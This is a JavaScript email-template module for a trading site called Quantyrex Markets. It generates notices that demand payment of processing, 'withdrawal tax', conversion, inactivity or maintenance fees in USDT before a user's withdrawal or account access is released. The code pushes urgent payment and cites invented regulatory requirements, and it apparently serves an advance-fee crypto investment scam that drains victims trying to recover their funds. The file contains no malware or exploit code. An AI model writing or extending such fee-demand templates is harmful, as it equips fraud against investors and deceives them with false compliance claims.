const baseProTemplate = require('./base-pro');
const { formatUSD } = require('./_money');

const FRONTEND_URL = process.env.FRONTEND_URL || 'https://quantyrexmarkets.vercel.app';

const FEE_CONTENT = {
  processing: {
    badge: 'TRANSACTION NOTICE',
    title: 'Transaction Verification Required',
    subtitle: 'To complete your withdrawal request, a verification and network processing charge is required for transaction authorization and compliance checks.',
    txType: 'Withdrawal',
    feeTypeLabel: 'Processing Fee',
    covers: ['Transaction Validation & Verification', 'Secure Network Transfer Authorization', 'Anti-Fraud Security Screening', 'Network Costs & Processing Services'],
    urgency: 'Please complete the fee payment to continue processing your transaction.',
    btnLabel: 'COMPLETE VERIFICATION'
  },
  tax: {
    badge: 'TAX NOTICE',
    title: 'Withdrawal Tax Fee Required',
    subtitle: 'In accordance with current financial regulations, a withdrawal tax must be settled before your transaction can be released. This is a regulatory compliance requirement.',
    txType: 'Tax Settlement',
    feeTypeLabel: 'Withdrawal Tax Fee',
    covers: ['Regulatory Compliance Filing', 'Government-Mandated Reporting', 'Audit Trail Documentation', 'Withdrawal Release Authorization'],
    urgency: 'Please complete the tax payment to release your withdrawal.',
    btnLabel: 'SETTLE TAX FEE'
  },
  conversion: {
    badge: 'CONVERSION NOTICE',
    title: 'Currency Conversion Fee Required',
    subtitle: 'A currency conversion fee applies to your transaction. This covers real-time exchange rate processing and multi-currency settlement services.',
    txType: 'Currency Conversion',
    feeTypeLabel: 'Currency Conversion Fee',
    covers: ['Real-Time Exchange Rate Processing', 'Multi-Currency Conversion Engine', 'Settlement Authorization', 'Conversion Verification'],
    urgency: 'Please complete the fee payment to finalize your conversion.',
    btnLabel: 'COMPLETE CONVERSION'
  },
  inactivity: {
    badge: 'REACTIVATION NOTICE',
    title: 'Account Reactivation Required',
    subtitle: 'Your account has been inactive for an extended period. An inactivity fee is required to reactivate your account and restore full trading privileges.',
    txType: 'Account Reactivation',
    feeTypeLabel: 'Account Inactivity Fee',
    covers: ['Full Trading Access Restoration', 'Withdrawal & Deposit Re-enablement', 'Bots & Copy Trading Activation', 'Account Security Refresh'],
    urgency: 'Welcome back. Please complete the fee payment to reactivate your account.',
    btnLabel: 'REACTIVATE ACCOUNT'
  },
  maintenance: {
    badge: 'MAINTENANCE NOTICE',
    title: 'Account Maintenance Fee Required',
    subtitle: 'A routine maintenance fee is required to keep your account operational. This covers infrastructure, security, and 24/7 platform monitoring.',
    txType: 'Account Maintenance',
    feeTypeLabel: 'Account Maintenance Fee',
    covers: ['Server Infrastructure & Uptime', '24/7 Security Monitoring', 'Continuous Platform Updates', 'Account Services Continuity'],
    urgency: 'Please complete the fee payment to maintain account services.',
    btnLabel: 'SETTLE MAINTENANCE FEE'
  },
  custom: {
    badge: 'TRANSACTION NOTICE',
    title: 'Outstanding Fee Notice',
    subtitle: 'An outstanding fee has been applied to your account that requires immediate attention. Please review the details below and complete the payment.',
    txType: 'Fee Settlement',
    feeTypeLabel: 'Outstanding Fee',
    covers: ['Transaction Authorization', 'Account Service Continuity', 'Payment Processing', 'Settlement Verification'],
    urgency: 'Please complete the fee payment to continue using your account.',
    btnLabel: 'COMPLETE PAYMENT'
  }
};

const friendlyLabel = (label, fallback) => {
  if (!label) return fallback;
  const raw = ['processing','tax','conversion','inactivity','maintenance','custom'];
  if (raw.includes(label.toLowerCase())) return fallback;
  return label.replace(/\b\w/g, c => c.toUpperCase());
};

const feeRequiredEmail = (name, feeLabel, feeAmount, currency, feeType, userId) => {
  const fee = FEE_CONTENT[feeType] || FEE_CONTENT.custom;
  const clientId = userId ? '#QXM-' + String(userId).slice(-5).toUpperCase() : '#QXM-' + Math.floor(Math.random() * 90000 + 10000);
  const now = new Date();
  const dateStr = now.toLocaleString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }) + ' · ' + now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
  const displayFeeLabel = friendlyLabel(feeLabel, fee.feeTypeLabel);

  const detailRow = (label, value, isLast) => `<tr>
<td style="padding:14px 18px;color:#a1a1aa;font-size:11px;font-weight:600;letter-spacing:1px;font-family:Arial,sans-serif;${isLast ? '' : 'border-bottom:1px solid #1f1f1f;'}">${label}</td>
<td align="right" style="padding:14px 18px;color:#ffffff;font-size:13px;font-weight:600;font-family:Arial,sans-serif;white-space:nowrap;${isLast ? '' : 'border-bottom:1px solid #1f1f1f;'}">${value}</td>
</tr>`;

  const coverItem = (num, text, isLast) => `<tr>
<td valign="top" width="36" style="padding:12px 0 12px 16px;vertical-align:top;${isLast ? '' : 'border-bottom:1px solid #1a1a1a;'}">
<table cellpadding="0" cellspacing="0" border="0" width="24" height="24" bgcolor="#6366f1" style="background-color:#6366f1;border-radius:50%;">
<tr><td align="center" valign="middle" width="24" height="24" style="line-height:24px;text-align:center;color:#ffffff;font-size:11px;font-weight:700;font-family:Arial,sans-serif;">${num}</td></tr>
</table>
</td>
<td valign="middle" style="padding:12px 16px;color:#e4e4e7;font-size:12px;line-height:1.5;font-family:Arial,sans-serif;${isLast ? '' : 'border-bottom:1px solid #1a1a1a;'}">${text}</td>
</tr>`;

  return baseProTemplate(`

<!-- ROW 1: HEADER LOGO TEXT -->
<tr>
<td bgcolor="#080808" style="background:#080808;padding:32px 24px 16px 24px;">
<span style="color:#ffffff;font-size:25px;font-weight:300;font-family:Arial,sans-serif;letter-spacing:0.2px;">Quantyrex</span>
<span style="color:#818cf8;font-size:25px;font-weight:300;font-family:Arial,sans-serif;letter-spacing:0.2px;margin-left:8px;">Markets</span>
</td>
</tr>

<!-- ROW 2: WHITE BAR DIVIDER (standalone tr - cannot be stripped) -->
<tr>
<td bgcolor="#080808" style="background:#080808;padding:0 24px 24px 24px;">
<table cellpadding="0" cellspacing="0" border="0" align="left">
<tr>
<td width="140" height="3" bgcolor="#ffffff" style="width:140px;height:3px;background-color:#ffffff;font-size:0;line-height:3px;mso-line-height-rule:exactly;">&nbsp;</td>
</tr>
</table>
</td>
</tr>

<!-- ROW 3: BADGE + TITLE + SUBTITLE -->
<tr>
<td bgcolor="#080808" style="background:#080808;padding:8px 24px 24px 24px;">
<div style="color:#6366f1;font-size:10px;font-weight:700;letter-spacing:2.5px;margin-bottom:12px;font-family:Arial,sans-serif;">${fee.badge}</div>
<div style="color:#ffffff;font-size:22px;font-weight:700;line-height:1.25;margin-bottom:18px;font-family:Arial,sans-serif;">${fee.title}</div>
<div style="color:#a1a1aa;font-size:13px;line-height:1.7;font-family:Arial,sans-serif;">${fee.subtitle}</div>
</td>
</tr>

<!-- ROW 4: DETAILS CARD -->
<tr>
<td bgcolor="#080808" style="background:#080808;padding:0 24px 16px 24px;">
<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#121212" style="background:#121212;border-radius:8px;">
${detailRow('CLIENT ID', clientId, false)}
${detailRow('TRANSACTION TYPE', fee.txType, false)}
${detailRow('NETWORK', 'USDT (TRC20)', false)}
${detailRow('DATE &amp; TIME', dateStr, true)}
</table>
</td>
</tr>

<!-- ROW 5: AMOUNT DUE CARD -->
<tr>
<td bgcolor="#080808" style="background:#080808;padding:0 24px 16px 24px;">
<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#121212" style="background:#121212;border-radius:8px;">
<tr><td align="center" style="padding:24px 20px 10px 20px;">
<div style="color:#a1a1aa;font-size:10px;letter-spacing:2px;font-family:Arial,sans-serif;margin-bottom:10px;">AMOUNT DUE</div>
<div style="color:#ffffff;font-size:32px;font-weight:300;font-family:Arial,sans-serif;line-height:1;">${formatUSD(feeAmount)}</div>
</td></tr>
<tr><td height="1" bgcolor="#1f1f1f" style="height:1px;background:#1f1f1f;font-size:0;line-height:0;">&nbsp;</td></tr>
<tr><td align="center" style="padding:14px 20px 22px 20px;">
<div style="color:#a1a1aa;font-size:10px;letter-spacing:1.5px;font-family:Arial,sans-serif;margin-bottom:6px;">FEE TYPE</div>
<div style="color:#818cf8;font-size:14px;font-weight:600;font-family:Arial,sans-serif;white-space:nowrap;">${displayFeeLabel}</div>
</td></tr>
</table>
</td>
</tr>

<!-- ROW 6: WHAT THIS FEE COVERS -->
<tr>
<td bgcolor="#080808" style="background:#080808;padding:0 24px 16px 24px;">
<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#121212" style="background:#121212;border-radius:8px;">
<tr><td style="padding:18px 16px 14px 16px;">
<div style="color:#6366f1;font-size:10px;font-weight:700;letter-spacing:2px;font-family:Arial,sans-serif;">WHAT THIS FEE COVERS</div>
</td></tr>
<tr><td style="padding:0 8px 6px 8px;">
<table width="100%" cellpadding="0" cellspacing="0" border="0">
${coverItem(1, fee.covers[0], false)}
${coverItem(2, fee.covers[1], false)}
${coverItem(3, fee.covers[2], false)}
${coverItem(4, fee.covers[3], true)}
</table>
</td></tr>
</table>
</td>
</tr>

<!-- ROW 7: URGENCY NOTICE -->
<tr>
<td bgcolor="#080808" style="background:#080808;padding:0 24px 12px 24px;">
<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#1a0f0f" style="background:#1a0f0f;border-radius:8px;">
<tr><td style="padding:14px 16px;color:#ff4000;font-size:12px;line-height:1.5;font-family:Arial,sans-serif;">
<b>Notice:</b> ${fee.urgency}
</td></tr>
</table>
</td>
</tr>

<!-- ROW 8: CTA BUTTON -->
<tr>
<td bgcolor="#080808" style="background:#080808;padding:8px 24px 28px 24px;" align="center">
<table cellpadding="0" cellspacing="0" border="0" width="100%">
<tr><td align="center" bgcolor="#6366f1" style="background:#6366f1;border-radius:6px;">
<a href="${FRONTEND_URL}/dashboard" style="display:block;color:#ffffff;font-size:12px;font-weight:600;letter-spacing:1.5px;padding:16px 24px;text-decoration:none;font-family:Arial,sans-serif;text-align:center;">${fee.btnLabel}</a>
</td></tr>
</table>
</td>
</tr>

<!-- ROW 9: FOOTER -->
<tr>
<td bgcolor="#080808" style="background:#080808;padding:20px 24px 28px 24px;border-top:1px solid #1a1a1a;">
<div style="color:#71717a;font-size:11px;line-height:1.5;font-family:Arial,sans-serif;margin-bottom:6px;">
<b style="color:#e4e4e7;">Need help?</b> <a href="mailto:support@quantyrexmarkets.com" style="color:#818cf8;text-decoration:none;">support@quantyrexmarkets.com</a>
</div>
<div style="color:#52525b;font-size:10px;font-family:Arial,sans-serif;">
&copy; ${new Date().getFullYear()} Quantyrex Markets · Automated message · Do not reply
</div>
</td>
</tr>

`);
};

module.exports = feeRequiredEmail;
